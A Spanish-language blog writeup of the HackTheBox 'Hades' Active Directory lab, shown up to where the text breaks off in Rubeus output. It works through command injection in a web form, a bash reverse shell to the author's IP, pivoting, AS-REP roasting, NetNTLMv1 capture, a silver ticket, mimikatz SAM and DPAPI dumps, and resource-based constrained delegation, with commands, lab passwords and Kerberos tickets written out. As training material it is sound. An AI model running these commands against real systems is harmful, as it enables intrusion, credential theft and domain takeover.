---
title: Hades - HackTheBox Writeup
date: 2023-08-01
categories: [HTB, EndGames]
tags: [Active Directory, Pivoting]
---

Antes de empezar quiero aclarar algunas cosas. No es que haya estado muerto estos meses, es que he estado estudiando **Active Directory**. También quiero aclarar por qué estoy hablando en español. Bueno, esto es por que no merece la pena hacer más writeups en inglés, ya que casi nadie me lee, prefiero explicar cosas en mi propio idioma. En fin, dejémonos de hablar y vamos a la tarea...

![](/assets/img/hades/1.png)
<small>[Pascu y Rodri, desripando la historia](https://www.youtube.com/@destripandolahistoria)</small>

Hoy os traigo más contenido de **Active Directory**: un EndGame de [HackTheBox](https://app.hackthebox.com/endgames/hades). Cabe destacar que necesitáis tener el [VIP](https://app.hackthebox.com/profile/subscriptions/plans) de HackTheBox. Sin embargo, os podéis quedar a leer y apuntar cosas, que también se aprende ehhh. Este EndGame toca cosas bastante chulas como pivoting y muchos conceptos de AD, ya entraremos más en detalle. 

# Reconocimiento

## nmap
---
Como en todo CTF o auditoría, empezamos escaneando los puertos (en este caso por el protocolo TCP) con la famosa herramienta [nmap](https://nmap.org).

```shell
nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 10.13.38.16 -oG allPorts
```

Esto nos dejará un archivo en un formato que con la utilidad [extractPorts](https://pastebin.com/tYpwpauW) de Marcelo Vázquez (aka [s4vitar](https://www.youtube.com/@s4vitar)) podemos aplicar expresiones regulares (regex) para extraer la información interesante de la captura. Con esto hecho, podemos pasar a aplicar un escaneo más en profundidad (escaneando versiones de los servicios).

```shell
nmap -sCV -p443 10.13.38.16 -oN targeted
```

Esto nos dejará una evidencia de todos los servicios y versiones que se están ejecutando en los puertos dados. 

## web
---
En este caso solo está el puerto 443 (https), lo cuál es raro, ya que sabemos que se trata de un entorno de AD. Gracias a esto podemos suponer que estamos ante un conenedor, lo cuál lo confirmaremos después. Podemos hacer hovering sobre los botones de la web, pero os puedo adelantar que el único interesante es el de `SSL Tools`. Este nos llevará a una plantilla en la que aparentemente se valida un certificado SSL de la IP dada. Bien, vamos a comprobar que hace esto en profundidad con `mitmdump`.

- Primero crearemos un servidor que se ejecute en el puerto 443. Esto se debe a que como la web está comprobando certificados SSL, no podemos poner una web en el puerto 80, que sería HTTP.

```shell
mitmdump -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=2
```

Con esto en ejecución podemos poner nuestra IP en la plantilla...

![](/assets/img/hades/2.png)

...y dándole al botón naranja vemos cositas interesantes en nuestro `mitmdump`:

![](/assets/img/hades/3.png)

# DOCKER

## www-data
---
El `User-Agent` nos indica que la petición se está efecutando con `curl`, por lo que aquí tenemos una vía potencial de ejecutar comandos. Podemos probar con `;`, `|` o `$()`. La última es la que sí funciona:

![](/assets/img/hades/4.png)

En el `mitmdump` podemos ver el resultado del comando `id`:

![](/assets/img/hades/5.png)

Ahora podemos probar a mandarnos una consola interactiva, hasta darnos cuenta que lo que no le gusta a la web son los espacios, por lo que podemos reemplazar el espacio por un `${IFS}`. Después de varias pruebas, funcionó el crear un archivo `index.html` que contenga el famoso oneliner de linux para mandarnos una consola interactiva, para con `curl` ejecutarlo con bash. Sería algo así:

- Primero creamos un servidor web con python que esté compartiendo el archivo `index.html`:

```shell
bash -c "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1"
```

- Luego en la web, hacemos un curl a nuestra IP. Como el archivo se llama index.html no hace falta que le indiquemos la ruta:

![](/assets/img/hades/6.png)

Y en nuestro netcat deberíamos obtener una shell como `www-data`:

![](/assets/img/hades/7.png)

## docker
---

Listando las interfaces de red podemos ver la `172.17.0.X`:

![](/assets/img/hades/8.png)

> Esta shell se va a morir la primera vez, pero a la segunda no debería terminarse. 

Haciendo `ssh` a la `172.17.0.1` con las credenciales por defecto de docker (docker:tcuser) nos podemos conectar. Sin embargo, se va a morir todo el rato y como vamos a necesitar hacer pivoting no es plan de tirarse de los pelos, por lo que desde la sesión de `www-data` podemos hacer que el puerto 22 de la 172.17.0.1 sea nuestro puerto 22:

```shell
./chisel client 10.10.14.6:9003 R:22:172.17.0.1:22
```

Y ahora nos conectamos al ssh:

```shell
❯ ssh docker@localhost
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
docker@localhost's password: tcuser
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@default:~$ sudo su
root@default:/home/docker# whoami
root
root@default:/home/docker# id                                                                                                                                                                                                  
uid=0(root) gid=0(root) groups=0(root)
root@default:/home/docker#  
```

# Reconicimiento del entorno de AD

Listando las interfaces de red en el docker, podemos ver una bastante interesatne, que es la 192.168.3.0/24. Esto nos lleva a deducir que es aquí donde se encuentran las máquinas conectadas al dominio, ya que con un binario estático de nmap podemos ver tres IPs:

![](/assets/img/hades/9.png)

Así que teniendo esto, nos volvemos a transferir el chisel a esta máquina y nos transferimos, esta vez no solo un puerto, si no toda la interfaz de red:

```shell
./chisel client 10.10.14.6:9003 R:socks 
```

Ahora usando `proxychains` podemos acceder a toda la interfaz de red:

![](/assets/img/hades/10.png)

Y efectivamente, aquí vemos las tres máquinas...

![](/assets/img/hades/11.png)

## AS-REP Roast
---
En un entorno de AD **siempre** es necesario enumerar kerberos; por lo tanto, subiremos una lista de usuarios de seclists al docker y el binario de kerbrute. Este, al ejecutarlo nos reportará cuatro usuarios:

![](/assets/img/hades/14.png)

Esto lo he explicado muchas veces; en un entorno de AD, teniendo usuarios válidos, siempre hay que probar un ataque `AS-REP Roast`. Si algún usuario cuenta con la configuración `UF_DONT_REQUIRE_PREAUTH` aplicada, nos devolverá un TGT (Ticket Granting Ticket), el cuál no se puede usar para aplicar PTH (Pass The Hash) pero sí para intentar crackearlo de manera offline:

![](/assets/img/hades/12.png)

Y bien, podemos ver que el usuario Bob cuenta con esta configuración, por lo que la herramienta `GetNPUsers.py` nos ha devuelto su TGT. Al tener una contraseña de m13rd@, `john` la ha encontrado en el rockyou y la ha conseguido romper. Ahora, con `crackmapexec` podemos validarla:

![](/assets/img/hades/13.png)

# DEV

## Conseguir NetNTLMv1
---
En este punto estuve un poco atascado ya que no encontraba mucha cosa... hasta que dí con algo interesante: spoolsv.exe. Nos podemos dar cuenta de esto con la herramienta `impacket-rpcdump`, que es una de las muchas de [Impacket](https://github.com/fortra/impacket) que tenemos que tener muy a mano en la hora de enumerar. En fin, sigamos.

```shell
proxychains -q impacket-rpcdump htb.local/bob:'Passw0rd1!'@dev.htb.local | cat -l java
```

Yo le meto el `cat -l java` por que a fin de cuentas mi `cat` es un `batcat`. Simplemente para que se vea bonito :D
Mirando los servicios que hay, podemos ver algo que llama la atención:

![](/assets/img/hades/15.png)

Voy a ser sincero; no tengo mucha idea de como funciona la explotación de este servicio, por que se acontece y demás, por lo que no me voy a meter en temas que no sé, os dejo a vosotros la investigación. Si me animo a indagar sobre este servicio seguramente actualice este post, pero de momento se queda solo con la explotación. Investigando sobre este servicio podemos llegar a la conclusión de que lo podemos explotar con la herramienta `printerbug.py`, de [krbrelayx](https://github.com/dirkjanm/krbrelayx). Os recomiendo que os clonéis este repo, está muy guay. 
Antes de nada, iniciaremos `Responder` para obtener un hash NetNTMLv1 que de manera offline deberíamos poder crackear... pero no podemos, os digo más adelante.
También necesitas editar el archivo `/etc/responder/Responder.conf` para que el challenge valga `112233445566`

```shell
❯ responder -I tun0 --lm
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

[+] Listening for events...
```

Ahora con la herramienta `printerbut` pondremos nuestra IP al final, por lo que esto nos debería devolver el hash NetNTLMv1 de la account machine:

![](/assets/img/hades/16.png)

Y fijaos en el responder:

![](/assets/img/hades/17.png)

Bueno, aquí vienen los lloros. No podemos crackear esto. Se supone que sí, pero cuando se lanzó el EndGame en 2019 creo, sí se podía crackear... ¿por qué? por que la web https://crack.sh estaba operativa. Ahora no, por lo que podrías pensar, bueno pues oye, me miro un writeup y saco el hash NT y bueno, no lo he podido crackear, no pasa nada... pues no. Este hash es dinámico, por lo que no puedes hacer el endgame por ti solo. Necesitas de alguien que haya pwneado todo el EndGame y te de ese hash NT. Me podeís contactar a mi discord si llegáis a este punto: https://discord.com/users/761528193005649920. Yo le agradezco mil gracias a [GatoGamer](https://gatogamer1155.github.io/) que me ayudó ya que no podía crackear el hash. En fin, con el hash NT en nuestra posesión, lo podemos comprobar con `crackmapexec`:

![](/assets/img/hades/18.png)

## Silver Ticket
---
Bueno, viendo las carpteas compartidas nos va a decir que nos comamos los mocos, así que lo que se me oucrre es, hacer un `Silver Ticket` attack. Para esto, necesitamos los siguientes datos:

- SID 
- Hash NT
- SPN

De momento tenemos dos, el hash NT (2de59b9dc48645b300796b62b10e17e2) y el SPN (cifs). El SID lo podemos sacar con la herramienta `impacket-getPac`:

![](/assets/img/hades/19.png)

Y bueno, con esto podemos crear un Silver Ticket impersonando al usuario Administrator con la herramienta `impacket-ticketer`:

![](/assets/img/hades/20.png)

Ahora exportamos la variable `KRB5CCNAME` para que apunte al archivo .ccache. 

```shell
export KRB5CCNAME='/home/ruy/Escritorio/HTB/Endgames/Hades/HADES-DEV/content/Administrator.ccache'
```

Y bien, ahora podemos validar que nuestro ticket es válido:

![](/assets/img/hades/21.png)

## Shell - nt authority\system
---
Bueno esto esto es algo curioso. La herramienta `crackmapexec` nos devuelve un `Pwn3d!`, sin embargo vemos que no tenemos una mierd* de privilegios en carpetas compartidas. Bueno, GatoGamer hizo una muy buena investigación sobre por qué ocurría esto y como explotarlo. Os lo dejo por [aquí](https://gatogamer1155.github.io/htb/resolute/#extra3). Sin embargo gato lo hace desde el mismo sistema, el cuál de momento no tenemos acceso. Yo lo voy a hacer con la herramienta `impacket-services`. La idea es crear un servicio `netcat`, que descargue nuestro netcat. Luego crear otro que ejecute `netcat`:

- Creamos el servicio `netcat`

![](/assets/img/hades/22.png)

- Lo ejecutamos (deberíamos ver un get en nuestro servidor). Esto nos tira un error, pero nada de lo que preocuparse:

![](/assets/img/hades/23.png)

![](/assets/img/hades/24.png)


- Creamos un servicio que se llame shell, que ejecutará `netcat`

![](/assets/img/hades/25.png)

- Y lo ejecutamos

![](/assets/img/hades/26.png)

Esto se quedará colgado, pero no es nada preocupante, de hecho, nos llegará una shell al puerto indicado... ¡y como nt authority\system!

![](/assets/img/hades/27.png)

Bueno, al esto ser un lab de pivoting, recomiendo usar `mimikatz` para dumpear la sam y así con el hash NT de administrator acceder más rápido por WinRM (aunque necesitaremos ser nt authority\system para la siguiente operación).

![](/assets/img/hades/28.png)

Con el comando `lsadump::sam` podemos ver el hash NT de administrator:

![](/assets/img/hades/29.png)

Está bien tener esto, pero no cerréis esta shell, la necesitamos para conseguir credenciales del usuario `test-svc`. 

# WEB

## Conseguir creds de test-svc
---
Podemos enumerar el sistema y encontrar menos cosas que lo que puede encontrar un mod de discord en su baño. Así que, después de mirar un poco más podemos ver cosillas interesantes en las `shadow copies`. Ah, para esto vete a una sesión WinRM, si no te va a decir que no encuentra el comando:

![](/assets/img/hades/30.png)

Bueno pues ojito al dato que aparentemente nos está encontrando cositas. Para hacerlo más cómodo, crearemos un link a `C:\VSS` para que sea una ruta más cómoda:

![](/assets/img/hades/31.png)

Y ahora, usaremos `mimikatz`, again... pero esta vez para dumpear la sam... de la copia:

![](/assets/img/hades/32.png)


Interesante, aquí podemos ver que nos está devolviendo otro hash NT, pero es diferente. Tratemos de crackearlo con `john`:

![](/assets/img/hades/33.png)

Pues tenemos esta contraseña, no sabemos el usuario, pero yo la voy a guardar por si acaso, a lo mejor la necesitamos después... quién sabe.
En este punto estuve casi un día descolocado por que no ataba cabos de qué podía hacer, pero suponía que tenía que tirar por las shadow copies, así que listemos las credenciales de administrator (de la shadow copy) podemos ver dos:

![](/assets/img/hades/34.png)

Ahora es cuando empiezo a sospechar que seguramente necesitemos descifrar las credenciales `DPAPI`. Bueno, para esto necesitamos también las `MASTERKEYS`. Estas suelen encontrarse en `C:\%USER%\AppData\Roaming\Microsoft\Protect\%SID%`:

![](/assets/img/hades/35.png)

Bueno, esto me va aclarando la cabeza, claramente necesitamos dumpear las credenciales `DPAPI`. Bueno, ahora necesitamos virtualizar una máquina windows, meterle el `mimikatz`, las dos credenciales y las dos masterkeys. Pero primero nos traemos las últimas a nuestro equipo.

![](/assets/img/hades/36.png)

![](/assets/img/hades/37.png)

Y ahora nos copiamos las dos credenciales:

![](/assets/img/hades/38.png)

Comprobemos que las tenemos en nuestro equipo:

![](/assets/img/hades/39.png)

Ahora necesitamos traer estas credenciales y sus masterkeys a nuestro windows virtualizado. Lo puedes hacer con un servidor de python o con un servidor de SMB. Yo ya tengo montado el de SMB, así que lo haré con este.
Vale recordáis la contraseña de antes? La necesitamos ahora. 

![](/assets/img/hades/40.png)

Al hacer esto, `mimikatz` guarda la masterkey y la cred `DPAPI` en cache, por lo que le pasamos los siguientes comandos y vemos los secretos escondidos en `DPAPI`:

![](/assets/img/hades/41.png)

Ahora le pasamos la primera credencial y podemos ver la flag:

![](/assets/img/hades/42.png)

Bueno pues muy bonita la flag pero lo que nos importa son credenciales. Bueno, si repetimos el último pero esta vez con la segunda credencial vemos cositas más interesantes:

![](/assets/img/hades/43.png)

Bueno pues guay, tenemos credenciales. Si las validamos con `crackmapexec` podemos ver que son válidas:

![](/assets/img/hades/44.png)

## Shell - remote_user
---
Estamos en un entorno de directorio activo, por lo que **siempre** usaremos BloodHound para enumerar. Hay veces (el 95% de ellas) que te da la clave para convertirte en Domain Admin. Yo voy a tirar de [BloodHound.py](https://github.com/dirkjanm/BloodHound.py).

![](/assets/img/hades/45.png)

Este zip lo podemos subir a BloodHound y ver que `test-svc` tiene un privilegio interesante sobre `WEB.HTB.LOCAL`:

![](/assets/img/hades/46.png)

Esto es bastante crítico. Para explotarlo necesitamos [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), [Powermad](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1), y [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe). Como esta tarea necesita de ser usuario nt authority\system, tenemos dos opciones:

- Volver a hacer lo de `impacket-services`.
- Ganar otra shell como este usuario de otra forma que voy a explicar.

Yo voy a hacer la segunda, ya que como este lab me está tomando (hasta este punto) 3 días, el hash NT de `DEV$` ya ha cambiado, por lo que el .ccache que conseguí con ese hash ya no es válido, y no es plan de estar molestando más a gato. Para explotar la segunda forma necesitaremos los módulos [Invoke-CommandAs](https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1) y [Invoke-ScheduledTask](https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1). Subiremos estos 5 archivos a la máquina DEV haciendo uso de la utilidad `upload` de `evil-winrm`:

![](/assets/img/hades/47.png)

Bueno se me olvidó, hay que subir también el `nc.exe`.
Ahora sí, empecemos a explotar este Domain Right.

Primero necesitamos ganar una consola como system:

![](/assets/img/hades/48.png)

Ahora desde esta PowerShell importaremos los módulos restantes:

![](/assets/img/hades/50.png)

Ahora, como estamos como el usuario administrator del ordenador DEV, necesitamos definir las credenciales del usuario `test-svc`, que es quién tiene el privilegio GenericAll sobre el ordenador WEB.

![](/assets/img/hades/51.png)

```powershell
$pass = ConvertTo-SecureString 'T3st-S3v!ce-F0r-Pr0d' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("htb.local\test-svc", $pass)
```

Con la variable `cred` definida podemos crear una nueva machine account al dominio con una contraseña fácil de recordar. Yo usaré 'ruycr4ft123$!':

![](/assets/img/hades/53.png)

```powershell
New-MachineAccount -MachineAccount ruycr4ft-pc -Password $(ConvertTo-SecureString 'ruycr4ft123$!' -AsPlainText -Force) -Credential $cred
```

Y después necesitamos ejecutar los siguientes comandos:

![](/assets/img/hades/54.png)

```powershell
$ComputerSid = Get-DomainComputer ruycr4ft-pc -Properties objectsid -Credential $cred | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

Y después de esto configuramos el objeto hacia el equipo WEB, el cuál tenemos este privilegio:

![](/assets/img/hades/55.png)

```powershell
Get-DomainComputer WEB -Credential $cred | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes} -Credential $cred
```

Ahora con `Rubeus` podemos tratar de convertir la contraseña 'ruycr4ft123$!' a un hash, para así luego tratar de obtener un ticket impersonando a administrator:

![](/assets/img/hades/56.png)

Si intentamos solicitar un ticket suplantando a administrator nos devolverá un error. 

```shell
PS C:\ProgramData> .\Rubeus.exe s4u /user:ruycr4ft-pc$ /rc4:9BDAE32322748193C95B6C64341FE895 /impersonateuser:Administrator /msdsspn:http/web.htb.local /domain:htb.local /ptt
.\Rubeus.exe s4u /user:ruycr4ft-pc$ /rc4:9BDAE32322748193C95B6C64341FE895 /impersonateuser:Administrator /msdsspn:http/web.htb.local /domain:htb.local /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3 

[*] Action: S4U

[*] Using rc4_hmac hash: 9BDAE32322748193C95B6C64341FE895
[*] Building AS-REQ (w/ preauth) for: 'htb.local\ruycr4ft-pc$'
[*] Using domain controller: 192.168.3.203:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE6DCCBOSgAwIBBaEDAgEWooIEAjCCA/5hggP6MIID9qADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4IDwDCCA7ygAwIBEqEDAgECooIDrgSCA6pKGhTCX4VoPzue
      kjFesIaMmFwjJA89sLMTMzYr2IAdNBEYjpTrFKcJWwvKazznL/EP0RMsq8EBm4a4cFRWycAjooRDYbYO
      LYEvB5alqMkFEuLeD5iTeEevKCCSzN3inWcfxJRXPknTj7m6oA1opbkgt2HYrShEJyD250/nJFgYvk20
      idL3hJB2wrx+u7vD9ZHBH587poPqvhFKZ0mgQ3MKg/c4WPMA9vTcbFCSDEMkoKszH6WnpXUL1KZ0KXUd
      D+zT+2jx6DEVSmCE2ulpClf244Nd1G/l9lXmLhCjhycPFP4gfZGHTIsOsPygsy0MU2gRFxH/poEh3j43
      LeBSEeUafR4X9yu7k1pspIbodv+e+aog7SvJrR2IXF3uCJ+f0M4ftgmXBtXITusv3WbR4LGAzxO32hxz
      DMMBGfMhP/NmvSGZB+eEaWlemsx5zIXZt7gFXIvwbeIz+afa2biFhArN9mnrQamXP0twB5+I4FexCNtI
      XD5Euwe+038l32roNAUV2ZfcYi7vfwHRc6GNhLIBLxfYraQtiFYOGESZrWHcu8Dzaq5nwucz7JZUyYRM
      N2pZnu97nblYal7OJXaiYqqfrfcYirliv00asxlXH65DmRoLPhYXUz2oK7YucUOERql8OCVj+b9SwYLG
      A3/PPPvWd5UlhBMhOIXgiS/TTdhhy55Bwr2ZYZu420d8FI2yjyoNsXxreZuMD1Ly3uqR4PdgHu4vZXWI
      u7XN7Zkpao40z9ss5nMkOrAyJ3C6sms3wMFfKUtifHT/npQdmyVZ4iJz3pK63aF8MChEviPc43WxYQd3
      5exwVC+Bu1fts6N0ODaKtM2IP4afB5wiiaqrCG+J1mmJfvypyuKrsjQJuWmKsLZP9YRO8ZvG1pHyCnwq
      MSmzvWXNqoDmCs0WU8puwzvGrH44Id4y3fGqycjAYkA8578B1nwtnU90QkzLeklQOGLZ9JDpPObpVSjA
      0YZ04R44obGeI3EznPUK+OFOHGIAjyklboXinyedV8lkyq7UeIIdc8UQsmtwmrB9qo91kX4ovCDHNoqW
      2z3jtxrsNG3gN73MI9LRapaTES0ANPNIR/b3nhW3hozb0G1xK3S7sIC1BDUUJO1Hq+arWxnr5kubVBnw
      l28A+TzFwfn/KN/su4gAtx3aY7qLP6OwY3H98nXBloxT9OW26Kqvj8q/qaiPL4D/Q90jryUM3A2IWcV6
      fTSc2VWlsKB8/pHCKQfE6x8iJ0jGn4zvLbbcvaOB0TCBzqADAgEAooHGBIHDfYHAMIG9oIG6MIG3MIG0
      oBswGaADAgEXoRIEEN98hORKSWjlhCtn5x8XlqWhCxsJSFRCLkxPQ0FMohkwF6ADAgEBoRAwDhsMcnV5
      Y3I0ZnQtcGMkowcDBQBA4QAApREYDzIwMjMwODAxMTIwMjUzWqYRGA8yMDIzMDgwMTIyMDI1M1qnERgP
      MjAyMzA4MDgxMjAyNTNaqAsbCUhUQi5MT0NBTKkeMBygAwIBAqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fs


[*] Action: S4U

[*] Building S4U2self request for: 'ruycr4ft-pc$@HTB.LOCAL'
[*] Using domain controller: dc1.htb.local (192.168.3.203)
[*] Sending S4U2self request to 192.168.3.203:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'ruycr4ft-pc$@HTB.LOCAL'
[*] base64(ticket.kirbi):

      doIFPDCCBTigAwIBBaEDAgEWooIEWjCCBFZhggRSMIIETqADAgEFoQsbCUhUQi5MT0NBTKIZMBegAwIB
      AaEQMA4bDHJ1eWNyNGZ0LXBjJKOCBB0wggQZoAMCARehAwIBAaKCBAsEggQHnaJmuEXetR1c/GBEpbHz
      aqvMH0GqM8LNmLhlXfPosev9+one0PwFqcs++9PDS4zr1MBt9AzLzeMTnQGIJaXu9bKCXrG3klnLQubZ
      9b3m19b2UTtWKJzeZ+v/j4ACADUsBv3r8VbpiLXAnDzRiFWL7Wm8MdaM79eURnYb5ipwLWsacb2UEt70
      PS6CnZXVOYuCtGTqHFMlpBS2iwj78ZuGyrXazU8mlehSFuTR2UGaevKTW2RqoyfzaGNjzAwKxhrw6f4x
      +WJc+hcTxvVFNf+LgfyTY7y50X59YJnUzHY8FzeUWXavQ1xk1iMIWmqszqmjdT5aViGpbjM26n47qYG/
      l/35erpPwdb4oAD1alKvilfb6i3JJeFb35SdcicqAYp999A9iH902fHxePytKrG/l8xoPk10RpY/WCPd
      /E+G7RZR+xiyuu9EBdDEGEbPsf1T/fdJmBJLdT7Hf0uP0MmHIw/WEENHbXnM2QgIOyFWyd2QDvYqy+uY
      mebg8YKIpuqE5kJTEpcbudHj1r6xeMeNcsmUbqtvStmOTfqI5SGY83lIiJNKlfaRnsIcl6xSIAS3YeJC
      z5B2k84tXQUh6CVJkUDovjYSv4Ynhs2BE5x/3s4I6jKsf82bd9VrC2siumKIM71XxtryeWdmxHsZFQCZ
      aUyFHa/hbiFerfofwGjYQc0XNij6xSjNt1UiJtLltXzeQuH3ajJUfO5DGfZFS9u0BvI4WGKnyjNpGzeo
      lw9onD67ZI2RDXIr/l73Yt/Ewmu6N0yAWWflzpm0LDn45kXwiAfW2rnZ7h/9glHe3Z2NJN9nwc84O2nM
      oD6IDZOG0cQ5SiujWGSReITBYnZk59nEHKsdTvs/DgIZENsvHqLWxfq83OAA4YjnTkSUIGg45L2ZPHxe
      5GCCrrxVghKKxsVFK4Lz0KCM1i6pNhxl5azQLZjV9OxPUc/IO+ZGaitkaXF9C1GHa3Lcqqonj5G5PXO3
      rVfMqH9BF3TOhqK6TenfWaTo8tkgNNoDVIC62iP8zIbRFAGQC3TMF0HRs9438RjzN/qkhuY+a5zkeGtj
      QKoFCcHBOdjcWCdfMn5P9m5YeKc5bGEdk6FPUeeuUNU8410BVNSXPGKHFWOUL6ZhtqkCCRdcPzf/z8in
      LgSRYPnD3p7SRHylUzZH0QqT4NdYPya9xBsdd0MdYYGVUeJYKUKK0I6E6vxrZm2MkQfQRRkP6dhPLgCJ
      U8foA+lNBqgO46tr0N1iY/3K+D6Qs7plJd6fS6i6BEFIQG+GLalnsoxNsg4jgCn+iJw4IRVMKxwkYaC2
      e183Z5gJ0MCqIlIQCbf9hT7WJK6UXN0SgmxccII9Rv2Xygp6t8e2+VytSQtmo0I4mrxk7dHOLz6jgc0w
      gcqgAwIBAKKBwgSBv32BvDCBuaCBtjCBszCBsKAbMBmgAwIBF6ESBBBAuj2Y8I9Mw0aYlJqqjMOCoQsb
      CUhUQi5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFAAChAAClERgPMjAyMzA4MDEx
      MjAyNTNaphEYDzIwMjMwODAxMjIwMjUzWqcRGA8yMDIzMDgwODEyMDI1M1qoCxsJSFRCLkxPQ0FMqRkw
      F6ADAgEBoRAwDhsMcnV5Y3I0ZnQtcGMk

[*] Impersonating user 'Administrator' to target SPN 'http/web.htb.local'
[*] Building S4U2proxy request for service: 'http/web.htb.local'
[*] Using domain controller: dc1.htb.local (192.168.3.203)
[*] Sending S4U2proxy request to domain controller 192.168.3.203:88

[X] KRB-ERROR (13) : KDC_ERR_BADOPTION

PS C:\ProgramData> 
```

No tengo ni la menor idea a que se debe esto, pero lo que sí que tengo en el punto de mira es el gurpo 'Operations', al que solamente pertenece el usuario `lee`. A lo mejor podemos tratar de suplantar a Lee en vez de administrator... y funciona:

![](/assets/img/hades/57.png)

```shell
PS C:\ProgramData> .\Rubeus.exe s4u /user:ruycr4ft-pc$ /rc4:9BDAE32322748193C95B6C64341FE895 /impersonateuser:lee /msdsspn:http/web.htb.local /domain:htb.local /ptt
.\Rubeus.exe s4u /user:ruycr4ft-pc$ /rc4:9BDAE32322748193C95B6C64341FE895 /impersonateuser:lee /msdsspn:http/web.htb.local /domain:htb.local /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3 

[*] Action: S4U

[*] Using rc4_hmac hash: 9BDAE32322748193C95B6C64341FE895
[*] Building AS-REQ (w/ preauth) for: 'htb.local\ruycr4ft-pc$'
[*] Using domain controller: 192.168.3.203:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE6DCCBOSgAwIBBaEDAgEWooIEAjCCA/5hggP6MIID9qADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4IDwDCCA7ygAwIBEqEDAgECooIDrgSCA6rtDeCWAHfZD/yF
      URAHjgh7378qGZ++hhv+oYrqf2072utbjeNluMt8br9bs8+uJzGdCqshwdN2JEwkJgQhI3wfxPRSB9cT
      FmqKms3OCwMWugkCCabYm38+ldHWcXD5FY6VgWOsIsYcByMBGz2WzCngoN0EygQMjEbmJdbnNsorPygZ
      y0XCyW/fgY31LsxCvXRa8WZM0NQk7wAyszcsNmelw0ev5D6+WyNLkS/lZ3sqgzpQxDKBEcbfFUOYgPeh
      SnT3HuPvb/Zs5HKamkm3dxZMEXcy3cfjXLLtD69sLuP7/JedDa8oZ1aM9HfTODkw3diLxYmbG/ioW6KK
      eBWXXsu15oLweI0Aq89h6GmhzbVQaOHXMSZWtfRKsl3+Afpyy2ywgmcTosZ704K+y6FKkZNf1WZgaPzB
      sGRn/oXxbv/7ColIHDe1QJKv6tL4Wv0JAmsmy7jc6sBcPlIjgn9qMf/VuWCMoMUf4p2Kl7eVP37Vtx2J
      SluUUFbsxNnGSY0MBtkGXxBa26s8O6IRja1RivS60B/IPaQXUKid61aPCfKwpwEkTHMokuCrm42YB6HQ
      zz2EdjXaSm0bIzmDSzhU0VZY3yxnLnVOmfW7EcpDScoMji/EPto8KEzd9ErEa+cMwECjhSlPi+el6pzC
      CZgLvzHOkAu6VTDixwY1+SY9f6i0A+S0zPe3GsJHx72X0Bpbm+6+pcGHowHigvIWfGAAGE6nQxwPOQHp
      AneSIV/yLePlhcppGYVBC6ZVnn8rTZos8fqc3FekHZpGigfsQO47Obmjo85IcOMASOkJMARTbACDCM08
      uR8TlQT/n8wkM9qdUaYvGNmJHzhNnzxcG51ZA+7y8VxMoZDh1d02HAuobBkSH4G58yKNtTzW61MCSn8T
      AqPszOD0ATu0EtsI3eAA9RdPNqbnApKVYvdwYXAZCtN1EW/SssUc9LXG/4EN77zTiG7l/kESt0QVqeNh
      NY3tLPGfmSbKL5jPYCnzmwKY9Sm6XlTEZ7463B/WfWSaEFlyAUtAnDwxO8qWbGvz/0Po7OqmttwG7Ua0
      oi0XJSbTC7Ah2nJHL+N0/nrgah5bG6Cn/g8mzGvDCFCRBmwFou2JyDhf8XHNfqJpnPrCo7NRzD3swlYb
      WPPImjAiHx3C3kE8hYHlpKdPddmKGevDUFb1BjgJ08QpudG8BZHaMaH/Kuo9VN5Lctqc9uUdE2+YO6Gc
      RDzF81vO4rcNNfcOlyaB3K6wiDhVNBXwmeRaSaOB0TCBzqADAgEAooHGBIHDfYHAMIG9oIG6MIG3MIG0
      oBswGaADAgEXoRIEEBZCouYWNr8luizPavnAc3WhCxsJSFRCLkxPQ0FMohkwF6ADAgEBoRAwDhsMcnV5
      Y3I0ZnQtcGMkowcDBQBA4QAApREYDzIwMjMwODAxMTIwNDM0WqYRGA8yMDIzMDgwMTIyMDQzNFqnERgP
      MjAyMzA4MDgxMjA0MzRaqAsbCUhUQi5MT0NBTKkeMBygAwIBAqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fs


[*] Action: S4U

